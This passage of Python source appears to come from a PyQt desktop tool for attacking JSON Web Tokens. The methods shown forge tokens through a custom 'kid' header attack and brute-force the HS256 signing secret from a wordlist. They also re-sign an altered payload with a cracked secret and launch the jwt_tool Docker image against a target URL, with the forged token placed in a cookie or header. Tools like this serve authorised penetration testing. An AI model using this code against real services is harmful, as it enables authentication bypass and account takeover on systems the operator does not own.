    def _do_kid_custom(self) -> None:
        if not self._require_parsed():
            return
        kid    = self._kid_in.text()
        secret = self._kid_secret_in.text().encode()
        if not kid:
            self._log("Enter a kid value above first.")
            return
        result = _kid_attack(self._h_b64, self._current_payload_b64(), kid, secret)
        self._set_result_token(result)
        self._log(
            f"\n[Custom kid attack]\n"
            f"kid={kid!r}  secret={secret!r}\n{result}"
        )

    # ── brute force ───────────────────────────────────────────────────────────

    def _browse_wl(self) -> None:
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist", "", "Text files (*.txt);;All files (*)"
        )
        if path:
            self._wordlist = path
            self._wl_lbl.setText(Path(path).name)

    def _start_brute(self) -> None:
        if not self._require_parsed():
            return
        if not self._sig_b64:
            self._log("No signature in token — nothing to brute-force.")
            return
        if not self._wordlist:
            self._log("Select a wordlist first (Browse…).")
            return
        self._log(f"\n[Brute Force] Starting — {self._wordlist}")
        self._brute_btn.setEnabled(False)
        self._stop_btn.setEnabled(True)
        self._brute = _BruteWorker(
            self._h_b64, self._current_payload_b64(),
            self._sig_b64, self._wordlist, parent=self,
        )
        def _on_found(secret: str) -> None:
            signed = _sign_hs256(self._h_b64, self._current_payload_b64(), secret.encode())
            self._set_result_token(signed)
            self._log(
                f"[Brute Force] SECRET FOUND: {secret!r}\n"
                "Signed token ready — copy it from the bar below."
            )
        self._brute.found.connect(_on_found)
        self._brute.progress.connect(self._log)
        self._brute.done.connect(self._on_brute_done)
        self._brute.start()

    def _stop_brute(self) -> None:
        if self._brute:
            self._brute.stop()

    def _on_brute_done(self) -> None:
        self._brute_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._log("[Brute Force] Done.")

    # ── jwt_tool Docker scan ──────────────────────────────────────────────────

    def _run_jwt_tool(self) -> None:
        token = self._token_input.text().strip()
        if not token:
            self._log("[jwt_tool] No token loaded — parse a JWT first.")
            return
        if self._jt_worker and self._jt_worker.isRunning():
            self._log("[jwt_tool] Already running.")
            return

        args = [
            "docker", "run", "--rm",
            "ticarpi/jwt_tool",
            token,
        ]

        url  = self._jt_url.text().strip()
        mode = self._jt_mode.currentText().split(" ")[0]

        if url and mode != "decode":
            args += ["-t", url]
            cookie = self._jt_cookie.text().strip()
            header = self._jt_header.text().strip()
            if cookie:
                args += ["-rc", f"{cookie}={token}"]
            elif header:
                # e.g. "Authorization: Bearer"
                args += ["-rh", f"{header} {token}"]
            args += ["-M", mode]

        self._log(f"\n[jwt_tool]  {' '.join(args)}\n{'─'*40}")
        self._jt_run_btn.setEnabled(False)
        self._jt_stop_btn.setEnabled(True)

        self._jt_worker = _JwtToolWorker(args, parent=self)
        self._jt_worker.output.connect(self._log)
        self._jt_worker.done.connect(self._on_jt_done)
        self._jt_worker.start()

    def _stop_jwt_tool(self) -> None:
        if self._jt_worker:
            self._jt_worker.stop()

    def _on_jt_done(self) -> None:
        self._jt_run_btn.setEnabled(True)
        self._jt_stop_btn.setEnabled(False)
        self._log("[jwt_tool] Done.")


# ── module helpers ────────────────────────────────────────────────────────────

def _hsep() -> QFrame:
    f = QFrame()
    f.setFrameShape(QFrame.HLine)
    f.setFixedHeight(1)
    f.setStyleSheet("background:#313244; border:none;")
    return f
